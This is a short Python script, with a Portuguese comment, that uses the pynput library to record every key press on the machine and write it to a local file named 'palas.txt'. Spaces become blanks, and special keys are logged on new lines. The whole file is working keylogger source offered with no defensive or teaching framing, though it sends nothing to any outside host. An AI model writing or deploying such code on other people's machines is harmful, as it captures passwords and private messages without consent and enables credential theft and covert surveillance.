#  pip install pynput, precisa instalar essa galeria
from pynput.keyboard import Listener

txt = open("palas.txt", 'w')
txt.close()


def log(teclado):
    print(str(teclado).replace("'", ""))
    txt2 = open("palas.txt", 'a')
    if str(teclado).replace("'", "") == "Key.space":
        txt2.write(" ")
        txt2.close()
    elif str(teclado)[0:3] == "Key":
        txt2.write("\n")
        txt2.write(str(teclado).replace("'", ""))
        txt2.write("-->  ")
        txt2.close()
    else:
        txt2.write(str(teclado).replace("'", ""))
        txt2.close()


with Listener(on_press=log) as monitor:
    monitor.join()
